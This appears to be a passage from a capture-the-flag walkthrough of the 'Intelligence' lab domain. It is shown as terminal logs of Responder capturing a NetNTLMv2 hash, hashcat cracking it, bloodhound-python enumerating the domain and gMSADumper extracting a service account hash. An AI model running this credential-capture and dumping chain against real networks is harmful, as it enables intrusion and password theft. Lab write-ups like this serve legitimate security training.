    Responder IP               [10.10.16.151]
    Responder IPv6             [fe80::cb03:915:ccc2:944c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-F4RWEBY0IAC]
    Responder Domain Name      [UWNO.LOCAL]
    Responder DCE-RPC Port     [49780]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:503e917328bebd52:21BFA21F88A97CF2FB10661C60B10B64:0101000000000000D8563FB59B34DD0111FF933DFA9D6C360000000002000800550057004E004F0001001E00570049004E002D004600340052005700450042005900300049004100430004001400550057004E004F002E004C004F00430041004C0003003400570049004E002D00460034005200570045004200590030004900410043002E00550057004E004F002E004C004F00430041004C0005001400550057004E004F002E004C004F00430041004C00080030003000000000000000000000000020000092294E6786D330E29C8DE91EDF910B2CE87995ABB3A5EC7EF897F806910C7C650A0010000000000000000000000000000000000009003C0048005400540050002F007700650062005F0065006E0069006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
[+] Exiting...
```

```bash
┌──(venv)─(kali㉿kali)-[~/Work/Kali/Intelligence/Users]
└─$ cat hash
Ted.Graves::intelligence:503e917328bebd52:21BFA21F88A97CF2FB10661C60B10B64:0101000000000000D8563FB59B34DD0111FF933DFA9D6C360000000002000800550057004E004F0001001E00570049004E002D004600340052005700450042005900300049004100430004001400550057004E004F002E004C004F00430041004C0003003400570049004E002D00460034005200570045004200590030004900410043002E00550057004E004F002E004C004F00430041004C0005001400550057004E004F002E004C004F00430041004C00080030003000000000000000000000000020000092294E6786D330E29C8DE91EDF910B2CE87995ABB3A5EC7EF897F806910C7C650A0010000000000000000000000000000000000009003C0048005400540050002F007700650062005F0065006E0069006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ hashcat -m 5600 Users/hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27370 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

TED.GRAVES::intelligence:503e917328bebd52:21bfa21f88a97cf2fb10661c60b10b64:0101000000000000d8563fb59b34dd0111ff933dfa9d6c360000000002000800550057004e004f0001001e00570049004e002d004600340052005700450042005900300049004100430004001400550057004e004f002e004c004f00430041004c0003003400570049004e002d00460034005200570045004200590030004900410043002e00550057004e004f002e004c004f00430041004c0005001400550057004e004f002e004c004f00430041004c00080030003000000000000000000000000020000092294e6786d330e29c8de91edf910b2ce87995abb3a5ec7ef897f806910c7c650a0010000000000000000000000000000000000009003c0048005400540050002f007700650062005f0065006e0069006c002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TED.GRAVES::intelligence:503e917328bebd52:21bfa21f8...000000
Time.Started.....: Tue Aug 25 03:14:48 2026 (4 secs)
Time.Estimated...: Tue Aug 25 03:14:52 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3323.0 kH/s (1.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10821632/14344385 (75.44%)
Rejected.........: 0/10821632 (0.00%)
Restore.Point....: 10813440/14344385 (75.38%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Ms.Jordan -> Miquela1
Hardware.Mon.#01.: Util: 54%

Started: Tue Aug 25 03:14:47 2026
Stopped: Tue Aug 25 03:14:53 2026
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ cat Users/Ted.Graves
Ted.Graves:Mr.Teddynx
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ bloodhound-python -c All -u Ted.Graves -p Mr.Teddy -d intelligence.htb -dc intelligence.htb -ns 10.129.95.154 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: intelligence.htb
INFO: Testing resolved hostname connectivity dead:beef::a12a:3fd7:ac14:7f1f
INFO: Trying LDAP connection to dead:beef::a12a:3fd7:ac14:7f1f
INFO: Testing resolved hostname connectivity dead:beef::db
INFO: Trying LDAP connection to dead:beef::db
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: intelligence.htb
INFO: Testing resolved hostname connectivity dead:beef::a12a:3fd7:ac14:7f1f
INFO: Trying LDAP connection to dead:beef::a12a:3fd7:ac14:7f1f
INFO: Testing resolved hostname connectivity dead:beef::db
INFO: Trying LDAP connection to dead:beef::db
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 00M 38S
INFO: Compressing output into 20260825032127_bloodhound.zip
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ ls -liah 20260825032127_bloodhound.zip
2793009 -rw-rw-r-- 1 kali kali 227K Aug 25 03:22 20260825032127_bloodhound.zip
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb Users or groups who can read password for svc_int$: > DC$ > itsupport svc_int$:::5e47bac787e5e1970cf9acdb5b316239
```